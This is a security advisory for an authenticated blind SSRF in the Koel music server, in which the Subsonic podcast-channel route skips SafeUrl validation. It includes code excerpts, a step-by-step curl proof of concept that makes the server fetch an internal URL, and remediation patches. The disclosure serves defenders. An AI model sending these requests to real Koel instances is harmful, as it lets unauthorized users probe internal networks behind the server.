# [M] Koel: Authenticated Blind SSRF via Subsonic Podcast Channel Creation

## Summary
Severity: Medium
Advisory: GHSA-w79m-f3jx-779v
CVE: CVE-2026-54492
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-07-15
Source: https://github.com/advisories/GHSA-w79m-f3jx-779v
Type: github-advisory

## Affected
- Packagist: `phanan/koel` — affected >=0 <9.7.0

## Details
### Summary
Koel `v9.6.0` protects the regular podcast subscription API with `SafeUrl`, but the Subsonic-compatible `createPodcastChannel.view` route does not apply the same protection. An authenticated user can supply a private URL and cause Koel to fetch it server-side during podcast parsing.

This was validated against `v9.6.0` (`352ea5ec27fa22294da8fb6beacb3d5552f0d09c`) using the official `phanan/koel:9.6.0` image.

This is distinct from `GHSA-7j2f-6h2r-6cqc`, which fixed unsafe episode enclosure URLs in versions `<= 9.3.4`. The issue here is a newer validation gap in the Subsonic route itself, still present in `v9.6.0`.

### Details
#### SafeUrl protects the regular podcast API only

The regular podcast subscription path validates the feed URL with `SafeUrl`:

- `app/Http/Requests/API/Podcast/PodcastStoreRequest.php`

```php
return [
    'url' => ['required', 'url', new SafeUrl()],
];
```

The Subsonic-compatible route does not:

- `routes/subsonic.php`
  - `createPodcastChannel.view`
- `app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php`

```php
return [
    'url' => ['required', 'string', 'url'],
];
```

That creates the same kind of trust-boundary mismatch as the radio issue: the main API rejects private targets, while the compatibility route accepts them.

#### The URL is fetched immediately by the podcast parser

The attacker-controlled URL is used by the podcast service during channel creation:

- `app/Http/Controllers/Subsonic/CreatePodcastChannelController.php`
- `app/Services/Podcast/PodcastService.php`

`PodcastService::addPodcast()` calls:

```php
$parser = $this->createParser($url);
```

and `createParser()` resolves to:

```php
return Poddle::fromUrl($url, 5 * 60, $this->client);
```

This means the SSRF happens as part of the channel creation flow itself. No separate playback step is needed.

#### This bypasses Koel's intended SSRF control for podcast URLs

Koel already added `SafeUrl` to the regular podcast API and has already published a podcast-related SSRF advisory. The Subsonic route does not reuse that same control, so it reintroduces a server-side fetch primitive for private destinations.

### PoC
The following steps were validated against the official `phanan/koel:9.6.0` image.

1. Authenticate and obtain an API token:

```bash
API_TOKEN=$(
  curl -sS -X POST http://127.0.0.1:18081/api/me \
    -H 'Content-Type: application/json' \
    --data '{"email":"admin@koel.dev","password":"KoelIsCool"}' \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])'
)
```

2. Obtain the user's Subsonic API key:

```bash
SUBSONIC_KEY=$(
  curl -sS http://127.0.0.1:18081/api/data \
    -H "Authorization: Bearer $API_TOKEN" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["current_user"]["subsonic_api_key"])'
)
```

3. Prepare an internal-only target URL. In my validation, I used a host-side RSS fixture reachable from the container through the Docker bridge:

```bash
TARGET_URL="http://172.17.0.1:18090/feed.xml?run=1"
```

4. Confirm the regular web API blocks the URL:

```bash
curl -i -X POST http://127.0.0.1:18081/api/podcasts \
  -H "Authorization: Bearer $API_TOKEN" \
  -H 'Accept: application/json' \
  -H 'Content-Type: application/json' \
  --data "{\"url\":\"$TARGET_URL\"}"
```

Expected result:

- HTTP `422`
- Error includes `The url must point to a public URL.`

5. Trigger the Subsonic route with the same URL:

```bash
curl -i -G http://127.0.0.1:18081/rest/createPodcastChannel.view \
  --data-urlencode "apiKey=$SUBSONIC_KEY" \
  --data-urlencode 'f=json' \
  --data-urlencode "url=$TARGET_URL"
```

Expected result:

- HTTP `200`
- JSON includes `"status":"ok"`

6. Confirm the server-side request happened by checking the internal HTTP service logs.

During validation, the local HTTP test server received `HEAD` and `GET ` requests for `/feed.xml?run=1`.

### Impact
An authenticated user can make Koel send server-side HTTP requests to internal destinations that are intentionally blocked by the main web API.

Validated impact:
- SSRF to loopback, Docker-bridge, and RFC1918 HTTP destinations reachable from the Koel server
- Internal service discovery and request execution through the podcast parser

Generic response-body exfiltration was not validated through this exact route. The confirmed impact is SSRF-based internal request execution.

### Remediation

The Subsonic podcast request validator should apply `SafeUrl`, and the parser entry point should reject unsafe targets as defense in depth.

Suggested patch for `app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php`:

```diff
diff --git a/app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php b/app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php
--- a/app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php
+++ b/app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php
@@
 namespace App\Http\Requests\Subsonic;
 
 use App\Http\Requests\Request;
+use App\Rules\SafeUrl;
@@
     public function rules(): array
     {
         return [
-            'url' => ['required', 'string', 'url'],
+            'url' => ['required', 'string', 'url', new SafeUrl()],
         ];
     }
 }
```

Suggested defense-in-depth patch for `app/Services/Podcast/PodcastService.php`:

```diff
diff --git a/app/Services/Podcast/PodcastService.php b/app/Services/Podcast/PodcastService.php
--- a/app/Services/Podcast/PodcastService.php
+++ b/app/Services/Podcast/PodcastService.php
@@
     private function createParser(string $url): Poddle
     {
+        if (!$this->network->isSafeUrl($url)) {
+            throw FailedToParsePodcastFeedException::create($url);
+        }
+
         return Poddle::fromUrl($url, 5 * 60, $this->client);
     }
 }
```

## References
- https://github.com/koel/koel/security/advisories/GHSA-w79m-f3jx-779v
- https://github.com/koel/koel/pull/2545
- https://github.com/koel/koel/commit/1331f335342b405e60ffabdd60f1f398508f996f
- https://github.com/koel/koel
- https://github.com/koel/koel/releases/tag/v9.7.0
